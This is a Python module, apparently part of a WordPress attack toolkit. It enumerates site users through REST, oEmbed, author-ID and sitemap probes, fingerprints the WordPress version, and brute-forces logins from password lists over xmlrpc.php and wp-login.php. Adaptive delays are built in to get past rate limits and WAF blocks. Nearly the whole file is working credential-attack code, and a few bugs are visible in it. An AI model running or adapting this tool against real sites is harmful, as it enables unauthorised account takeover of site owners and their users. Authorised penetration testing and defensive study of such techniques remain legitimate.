import re, time
from urllib.parse import quote
from bs4 import BeautifulSoup
from packaging.version import Version, InvalidVersion
from Dependencies.displays import M, W, R, Y, G, C, handle_error
from Dependencies.get_request import get_request
from Dependencies.save_output import add_result


# -------------------------------------------------
# Helpers
# -------------------------------------------------
def valid_response(response):
    return hasattr(response, "status_code")
    

# -------------------------------------------------
# Detect users
# -------------------------------------------------
def extract_author_from_url(url):
    if not url:
        return None

    match = re.search(r"/(?:author|auteur)/([^/]+)/?", url, re.I)
    if match:
        return match.group(1)
    return None


def extract_author_from_html(html):
    if not html:
        return None

    soup = BeautifulSoup(html, "html.parser")

    # WP >= 3
    title = soup.select_one("h1.page-title span")
    if title:
        username = title.text.strip()
        if username:
            return username


    # body class author-xxx
    match = re.search(r'author-([^\s"]+)', html, re.I)
    if match:
        return match.group(1)

    return None


def basic_endpoint(args):
    endpoints = [
        # REST API
        "wp-json/wp/v2/users",
        "wp-json/wp/v2/users/",
        
        # old route REST
        "?rest_route=/wp/v2/users",
        "?rest_route=/wp/v2/users/",
        
        # oEmbed
        f"wp-json/oembed/1.0/embed?url={quote(args.url)}",
        
        # posts REST
        "wp-json/wp/v2/posts",
        "wp-json/wp/v2/posts/"
    ]
    
    base = args.url if args.url.endswith("/") else args.url + "/"
    results = []
    for endpoint in endpoints:
        if args.verbose:
            print(f'{G}[*] {W}Probing {base}{endpoint}')
        
        response = get_request(args, base + endpoint, timeout=30)

        if not valid_response(response):
            continue

        if response.status_code != 200:
            continue

        try:
            data = response.json()
            results.append({"endpoint": endpoint, "data": data})
            
        except Exception:
            continue
    return results


def author_id_scan(args, start=1, end=2):
    users = set()
    base = args.url if args.url.endswith("/") else args.url + "/"
    
    for author_id in range(start, end + 1):
        url = (f"{base}?author={author_id}")
        if args.verbose:
            print(f'{G}[*] {W}Probing {url}')

        response = get_request(args, url, timeout=30)
        if not valid_response(response):
            continue

        # redirection /author/user/
        username = extract_author_from_url(response.url)
        if username:
            users.add(username)
            continue

        # fallback HTML
        username = extract_author_from_html(response.text)
        if username:
            users.add(username)

    return users


def author_sitemap(args):
    users=set()
    sitemaps = [
        "wp-sitemap-users-1.xml",
        "author-sitemap.xml"
    ]

    base = args.url if args.url.endswith("/") else args.url + "/"
    for sitemap in sitemaps:
        if args.verbose:
            print(f'{G}[*] {W}Probing {base + sitemap}')
            
        response = get_request(args, base + sitemap, timeout=30)
        if not valid_response(response):
            continue

        if response.status_code != 200:
            continue

        matches = re.findall(r"/author/([^/]+)/", response.text, re.I)
        for user in matches:
            users.add(user)

    return users


def get_user(args):
    users=set()

    # endpoints REST/Oembed
    results = basic_endpoint(args)
    for result in results:
        data = result["data"]

        # REST users / posts
        if isinstance(data, list):
            endpoint = result["endpoint"]
            for item in data:
                if "/users" in endpoint:
                    slug = item.get("slug")
                    
                    if slug:
                        users.add(slug)

                elif "/posts" in endpoint:
                    links = item.get("_links", {})
                    for author in links.get("author", []):
                        href = author.get("href")
                        if not href:
                            continue

                        response = get_request(args, href, timeout=30)
                        if valid_response(response) and response.status_code == 200:
                            data = response.json()
                            slug = data.get("slug")
                            if slug:
                                users.add(slug)

        # oEmbed
        elif isinstance(data,dict):
            author = data.get("author_name")

            if author:
                users.add(author)

            author_url = data.get("author_url")
            username = extract_author_from_url(author_url)
            if username:
                users.add(username)

    # authors
    users.update(author_id_scan(args, 1, 20))
    
    # sitemap
    users.update(author_sitemap(args))
    
    clean_users = set()
    for user in users:
        if user.startswith("http"):
            continue

        if user.isdigit():
            continue

        if len(user) > 60:
            continue

        clean_users.add(user)
    return list(clean_users)


# -------------------------------------------------
# Detect Wordpress version (system.multicall for Wordpress < 4.4)
# -------------------------------------------------
def is_wordpress_before_44(version):
    if not version:
        return None

    try:
        return Version(version) < Version("4.4")
    except InvalidVersion:
        return None

def get_wordpress_version(args):
    base = args.url.rstrip("/")

    #
    # 1. <meta name="generator">
    #
    if args.verbose:
        print(f'{G}[*] {W}Checking <meta name="generator">')
        
    response = get_request(args, base, timeout=30)
    if valid_response(response) and response.status_code == 200:
        soup = BeautifulSoup(response.text, "html.parser")

        generator = soup.find("meta", attrs={"name": "generator"})

        if generator:
            content = generator.get("content", "")
            match = re.search(r"WordPress\s+([0-9]+(?:\.[0-9]+)+)", content, re.I)
            if match:
                return match.group(1)

    #
    # 2. /feed/
    #
    if args.verbose:
        print(f'{G}[*] {W}Checking {base}feed/')
        
    response = get_request(args, f"{base}feed/", timeout=30)
    if valid_response(response) and response.status_code == 200:

        match = re.search(r"WordPress\s+([0-9]+(?:\.[0-9]+)+)", response.text, re.I)
        if match:
            return match.group(1)

    #
    # 3. /readme.html
    #
    if args.verbose:
        print(f'{G}[*] {W}Checking {base}readme.html')
        
    response = get_request(args, f"{base}readme.html", timeout=30)
    if valid_response(response) and response.status_code == 200:
        match = re.search(r"Version\s+([0-9]+(?:\.[0-9]+)+)", response.text, re.I)
        if match:
            return match.group(1)

    #
    # 4. Search ?ver=x.y.z in assets
    #
    if args.verbose:
        print(f'{G}[*] {W}Checking for ?ver=x.y.z in the assets')
        
    response = get_request(args, base, timeout=30)
    if valid_response(response) and response.status_code == 200:
        match = re.search(r"\?ver=([0-9]+(?:\.[0-9]+)+)", response.text)
        if match:
            return match.group(1)

    return None


# -------------------------------------------------
# Detect auth method aviable for users
# -------------------------------------------------
def detect_authentication(args):
    auth = {
        "wp_login": False,
        "xmlrpc": False,
        "xmlrpc_vuln": False,
    }

    base = args.url if args.url.endswith("/") else args.url + "/"

    #
    # wp-login.php
    #
    if args.verbose:
        print(f"{G}[*] {W}Probing {base}wp-login.php")
        
    response = get_request(args, f"{base}wp-login.php", timeout=30)
    if valid_response(response):
        if response.status_code == 200:
            auth["wp_login"] = True

    #
    # xmlrpc.php
    #
    if args.verbose:
        print(f"{G}[*] {W}Probing {base}xmlrpc.php")
        
    response = get_request(args, f"{base}xmlrpc.php", timeout=30)
    if valid_response(response):
        # Réponse classique WordPress
        if (response.status_code in (200, 405) or "XML-RPC server accepts POST requests only." in response.text):
            auth["xmlrpc"] = True
            if args.verbose:
                print(f"{G}[*] {W}Searching for system.multicall vuln based on Wordpress version")
                
            version = get_wordpress_version(args)
            if version:
                print(f"{G}[+] {W}WordPress {version}")
                if is_wordpress_before_44(version):
                    print(f"{Y}[!] {W}system.multicall may be aviable")
                    auth["xmlrpc_vuln"] = True
                    
    return auth


def available_auth_methods(auth):
    methods=[]
    if auth["xmlrpc_vuln"]:
        methods.append("xmlrpc_multicall")

    if auth["xmlrpc"]:
        methods.append("xmlrpc")

    if auth["wp_login"]:
        methods.append("wp_login")

    return methods


# -------------------------------------------------
# Bruteforce login
# -------------------------------------------------
def get_passwords(args):
    if not args.password:
        return []

    if not args.password.startswith("@"):
        return [args.password]

    filename = args.password[1:]
    encodings = [
        "utf-8",
        "utf-8-sig",
        "cp1252",
        "latin-1"
    ]

    for encoding in encodings:
        try:
            with open(filename, "r", encoding=encoding) as f:
                passwords = [
                    p.strip()
                    for p in f
                    if p.strip()
                ]

            if args.verbose:
                print(f"{G}[*] {W}Loaded passwords using {encoding}")

            return passwords

        except UnicodeDecodeError:
            continue

    raise UnicodeDecodeError(
        "unknown",
        b"",
        0,
        1,
        "Unable to decode password file"
    )


class RateController:
    def __init__(self, delay=0.5):
        self.delay = delay
        self.max_delay = 60

    def success(self):
        self.delay = max(0.1, self.delay * 0.8)

    def forbidden(self):
        self.delay = min(self.delay * 3, self.max_delay)

    def ratelimit(self):
        self.delay = min(self.delay * 5, self.max_delay)

    def wait(self):
        time.sleep(self.delay)


class ProgressTracker:
    def __init__(self,total):
        self.total = total
        self.current = 0
        self.start = time.time()

    def update(self, user=None, password=None):
        self.current += 1
        elapsed = time.time() - self.start
        speed = (self.current / elapsed if elapsed > 0 else 0)
        remaining = self.total - self.current
        eta = (remaining / speed if speed else 0)
        line = f"{G}[{self.current}/{self.total}] {W}{speed:.2f}/s ETA:{eta:.0f}s {C}{user}:{password}"
        print("\r\033[K" + line, end="", flush=True)

    def finish(self):
        print()


def analyze_response(response):
    if response is None:
        return "error"
        
    if isinstance(response, str):
        if response == "timeout":
            return "timeout"
        return "error"

    if response.status_code == 403:
        return "forbidden"

    if response.status_code == 429:
        return "ratelimit"

    if response.status_code >= 500:
        return "server_error"

    return "ok"


def adaptive_request(args, controller, url, **kwargs):
    controller.wait()
    response = get_request(args, url, **kwargs)
    state = analyze_response(response)

    if state == "forbidden":
        if args.verbose:
            print(f" {Y}[!] 403 detected, slowing down")

        controller.forbidden()

    elif state == "ratelimit":
        if args.verbose:
            print(f" {Y}[!] Rate limit detected")

        controller.ratelimit()

    else:
        controller.success()

    return response


def build_xmlrpc_payload(username, password):

    return f"""<?xml version="1.0"?>
<methodCall>
<methodName>wp.getUsersBlogs</methodName>
<params>
<param>
<value><string>{username}</string></value>
</param>
<param>
<value><string>{password}</string></value>
</param>
</params>
</methodCall>"""


def xmlrpc_multicall_login(args, users, passwords):
    controller = RateController()
    total = len(users) * len(passwords)
    tracker = ProgressTracker(total)
    for user in users:
        for password in passwords:
            tracker.update(user, password)
            if xmlrpc_login(args, user, password, controller):
                tracker.finish()
                return {
                    "user": user,
                    "password": password,
                    "method": "xmlrpc"
                }
                
    tracker.finish()
    return None


def xmlrpc_login(args, user, password, controller):
    base = args.url if args.url.endswith("/") else args.url + "/"
    url = base + "xmlrpc.php"

    payload = build_xmlrpc_payload(user, password)
    response = adaptive_request(args, controller, url, method="POST", data=payload, headers={"Content-Type":"text/xml"}, timeout=30)

    if not valid_response(response):
        return False

    if response.status_code == 403:
        return "blocked"

    if response.status_code != 200:
        return False

    if "<name>isAdmin</name>" in response.text:
        return True

    return False


def wp_login(args, user, password, controller, cookie_test):
    base = args.url if args.url.endswith("/") else args.url + "/"
    login_url = base + "wp-login.php"
    payload = {
        "log": user,
        "pwd": password,
        "wp-submit": "Log In",
        "redirect_to": base + "wp-admin/",
        "testcookie": "1"
    }

    response = adaptive_request(args, controller, login_url, method="POST", cookies=cookie_test, data=payload, allow_redirects=False, timeout=30)
    if not valid_response(response):
        return False

    location = response.headers.get("Location", "")
    if "wp-admin" in location:
        return True

    if "wordpress_logged_in" in response.headers.get("Set-Cookie", ""):
        return True

    return False


# -------------------------------------------------
# Main call
# -------------------------------------------------
def wordpress_fuzz(args):
    try:
        if args.user:
            if args.user.startswith("@"):
                with open(
                    args.user[1:],
                    "r",
                    encoding="utf-8"
                ) as f:
                    
                    users = [
                        u.strip()
                        for u in f
                        if u.strip()
                    ]

            else:
                users=[args.user]

        else:
            users=get_user(args)

        if args.verbose:
            print()

        if not users:
            print(f"{M}[-] No WordPress users found")
            return
        
        if not args.user:
            print(f"{Y}[!] Found {len(users)} user(s)")

            for user in users:
                print(f"    {G}- {R}{user}")

            print()

        if args.password:
            passwords = get_passwords(args)
            auth = detect_authentication(args)
            print(f"\n{Y}[!] Authentication surface")
            print(f"    {f'{G}[+] {W}' if auth['wp_login'] else f'{M}[-] {W}'}wp-login.php")
            print(f"    {f'{G}[+] {W}' if auth['xmlrpc'] else f'{M}[-] {W}'}xmlrpc.php")
            print(f"    {f'{G}[+] {W}' if auth['xmlrpc_vuln'] else f'{M}[-] {W}'}system.multicall")

            if not auth:
                return

            methods = available_auth_methods(auth)
            
            if not methods:
                print(f"\n{M}[-] No authentication surface")
                return

            print()
            for method in methods:
                print(f"{Y}[!] Trying {method}")
                if method == "xmlrpc_multicall":
                    result = xmlrpc_multicall_login(args, users, passwords)

                elif method == "xmlrpc":
                    result = None
                    controller = RateController()
                    total = len(users) * len(passwords)
                    tracker = ProgressTracker(total)
                    for user in users:
                        for password in passwords:
                            tracker.update(user, password)
                            status = xmlrpc_login(args, user, password, controller)
                            if status is True:
                                result = {
                                    "user": user,
                                    "password": password,
                                    "method": "xmlrpc"
                                }
                                tracker.finish()
                                break

                            elif status == "blocked":
                                print(f"{Y}[!] XML-RPC blocked by WAF (403), switching method")
                                tracker.finish()
                                result = None
                                break

                        if result:
                            print(f"{G}[+] Found credentials")
                            return result

                    if not result:
                        tracker.finish()

                elif method == "wp_login":
                    result = None
                    total = len(users) * len(passwords)
                    tracker = ProgressTracker(total)
                    controller = RateController()
                    
                    base = args.url if args.url.endswith("/") else args.url + "/"
                    login_url = base + "wp-login.php"
                    response = get_request(args, login_url)
                    cookies = response.cookies.get_dict()
                    
                    for user in users:
                        for password in passwords:
                            tracker.update(user, password)
                            status = wp_login(args, user, password, controller, cookies)
                            if status is True:
                                result = {
                                    "user": user,
                                    "password": password,
                                    "method": "wp_login"
                                }
                                tracker.finish()
                                break

                        if result:
                            break

                    if not result:
                        tracker.finish()

        return
    except Exception as e:
        handle_error(e, "ERROR", args.verbose)
        return []